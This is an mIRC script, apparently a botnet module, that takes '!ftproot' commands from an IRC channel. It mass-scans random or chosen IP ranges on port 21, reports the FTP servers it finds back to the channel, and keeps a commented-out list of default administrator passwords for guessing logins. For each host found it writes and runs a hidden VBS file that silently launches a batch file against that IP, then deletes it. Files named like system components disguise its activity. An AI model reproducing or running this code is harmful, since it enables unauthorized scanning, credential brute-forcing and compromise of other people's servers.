on 10:text:!ftproot *:*:{
  set %chan $chan
  if ($2 == stop) {
    timerFTPServerScan* Off
    sockclose FTPServerScan*
    msg %chan FTP Scan Stopped
    halt
  }
  if ($2 == status) {
    if ($timer(FTPServerScan0) == $null) {
      ;msg %chan FTP Script Unactive
      halt
    }
    if ($timer(FTPServerScan0) != $null) {
      if ($lines(ntserver.vxd) == $null) {
        if (%ftpskill == $null) { set %ftpskill 0 }
        msg %chan FTP Scan (Range) $longip(%FTPServerScanStartIp) -> $longip(%FTPServerScanEndIp) (Current) $longip(%FTPServerScanCurrentIp) (Sockets Open) $sock(FTPServerScan*,*) (Found) %ftpskill
        halt
      }
    }
  }
  if ($2 == resume) {
    if (%FTPServerScanStartIp == $null) {
      msg %chan FTP Scan (Error) Cannot Resume
      halt
    }
    if (%FTPServerScanCurrentIp == $null) {
      msg %chan FTP Scan (Error) Cannot Resume
      halt
    }
    if (%FTPServerScanEndIp == $null) {
      msg %chan FTP Scan (Error) Cannot Resume
      halt
    }
    if (%FTPServerScanCurrentIp == %FTPServerScanEndIp) {
      msg %chan FTP Scan (Error) Scan Complete
      halt
    }
    msg %chan FTP Scan in Progress (Range) $longip(%FTPServerScanCurrentIP) -> $longip(%FTPServerScanEndIP)
    timerFTPServerScan0 -o 0 5 FTPServerScan
    timerFTPServerScan1 -o 0 5 FTPServerScan
    timerFTPServerScan2 -o 0 5 FTPServerScan
    timerFTPServerScan3 -o 0 5 FTPServerScan
    timerFTPServerScan4 -o 0 5 FTPServerScan
    timerFTPServerScan5 -o 0 5 FTPServerScan
    timerFTPServerScan6 -o 0 5 FTPServerScan
    timerFTPServerScan7 -o 0 5 FTPServerScan
    timerFTPServerScan8 -o 0 5 FTPServerScan
    timerFTPServerScan9 -o 0 5 FTPServerScan
    timerFTPServerScan10 -o 0 5 FTPServerScan
    timerFTPServerScan11 -o 0 5 FTPServerScan
    timerFTPServerScan12 -o 0 5 FTPServerScan
  }
  if ($2 == start) && ($3 == random) {
    unset %ftpskill
    set %ip $rand(1,255) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255) 
    set %FTPServerScanStartIp %ip $+ .1
    set %FTPServerScanCurrentIp %ip $+ .1
    set %FTPServerScanEndIp %ip $+ .255
    timerFTPServerScan0 -o 0 5 FTPServerScan
    timerFTPServerScan1 -o 0 5 FTPServerScan
    timerFTPServerScan2 -o 0 5 FTPServerScan
    timerFTPServerScan3 -o 0 5 FTPServerScan
    timerFTPServerScan4 -o 0 5 FTPServerScan
    timerFTPServerScan5 -o 0 5 FTPServerScan
    timerFTPServerScan6 -o 0 5 FTPServerScan
    timerFTPServerScan7 -o 0 5 FTPServerScan
    timerFTPServerScan8 -o 0 5 FTPServerScan
    timerFTPServerScan9 -o 0 5 FTPServerScan
    timerFTPServerScan10 -o 0 5 FTPServerScan
    timerFTPServerScan11 -o 0 5 FTPServerScan
    timerFTPServerScan12 -o 0 5 FTPServerScan
    set %FTPServerScanStartIp $longip(%FTPServerScanStartIp)
    set %FTPServerScanCurrentIp $longip(%FTPServerScanCurrentIp)
    set %FTPServerScanEndIp $longip(%FTPServerScanEndIp)
    msg %chan FTP Scan in Progress (Range) $longip(%FTPServerScanStartIp) -> $longip(%FTPServerScanEndIp)
  }
  if ($2 == start) && ($me == $5) {
    unset %ftpskill
    set %FTPServerScanStartIp $3
    set %FTPServerScanCurrentIp $3
    set %FTPServerScanEndIp $4
    timerFTPServerScan0 -o 0 5 FTPServerScan
    timerFTPServerScan1 -o 0 5 FTPServerScan
    timerFTPServerScan2 -o 0 5 FTPServerScan
    timerFTPServerScan3 -o 0 5 FTPServerScan
    timerFTPServerScan4 -o 0 5 FTPServerScan
    timerFTPServerScan5 -o 0 5 FTPServerScan
    timerFTPServerScan6 -o 0 5 FTPServerScan
    timerFTPServerScan7 -o 0 5 FTPServerScan
    timerFTPServerScan8 -o 0 5 FTPServerScan
    timerFTPServerScan9 -o 0 5 FTPServerScan
    timerFTPServerScan10 -o 0 5 FTPServerScan
    timerFTPServerScan11 -o 0 5 FTPServerScan
    timerFTPServerScan12 -o 0 5 FTPServerScan
    msg %chan FTP Scan in Progress (Range) $longip($3) -> $longip($4)
  }
}
alias FTPServerScan {
  if (%FTPServerScanCurrentIP == %FTPServerScanEndIp) {
    msg %chan FTP Scan Complete (Range) $longip(%FTPServerScanStartIp) -> $longip(%FTPServerScanEndIp)
    //hop %chan All done with $longip(%FTPServerScanStartIp) -> $longip(%FTPServerScanEndIp)
    sockclose FTPServerScan*
    timerFTPServerScan* Off
    halt
  }
  if (%FTPServerScanCurrentIP != %FTPServerScanEndIp) {
    inc %FTPServerScanCurrentIp 1
    sockopen FTPServerScan $+ %FTPServerScanCurrentIp $longip(%FTPServerScanCurrentIp) 21
    halt
  }
}
on *:sockopen:FTPServerScan*:{
  if ($sockerr) {
    sockclose $sockname
    halt
  }
  else {
    inc %ftpskill
    msg %chan FTP Found on $sock($sockname).ip (Amount %ftpskill $+ )
    //sockwrite $sockname USER administrator
    //sockwrite $sockname PASS Administrator
    //sockwrite $sockname PASS $chr(32)
    //sockwrite $sockname PASS admin
    //sockwrite $sockname USER administrator
    //sockwrite $sockname PASS 123
    //sockwrite $sockname PASS 1234
    //sockwrite $sockname PASS 12345
    //sockwrite $sockname USER administrator
    //sockwrite $sockname PASS 123456
    //sockwrite $sockname PASS 1234567
    //sockwrite $sockname PASS 12345678
    //sockwrite $sockname USER administrator
    //sockwrite $sockname PASS 123456789
    //sockwrite $sockname PASS 123456789
    //sockwrite $sockname PASS 123456789
    //sockwrite $sockname USER administrator
    //sockwrite $sockname USER administrator
    //sockwrite $sockname USER administrator
    //sockwrite $sockname USER administrator
    //sockwrite $sockname USER administrator

    write root $+ $sock($sockname).ip $+ .vbs on error resume next
    write root $+ $sock($sockname).ip $+ .vbs Set fso = CreateObject("Scripting.FileSystemObject")
    write root $+ $sock($sockname).ip $+ .vbs windows = fso.GetSpecialFolder(WindowsFolder)
    write root $+ $sock($sockname).ip $+ .vbs Set src3 = CreateObject("Wscript.shell")
    write root $+ $sock($sockname).ip $+ .vbs src3.run "system32.bat $sock($sockname).ip $+ ",0,true
    timer 1 650 remove root $+ $sock($sockname).ip $+ .vbs
    run root $+ $sock($sockname).ip $+ .vbs
    sockclose $sockname
  }
}
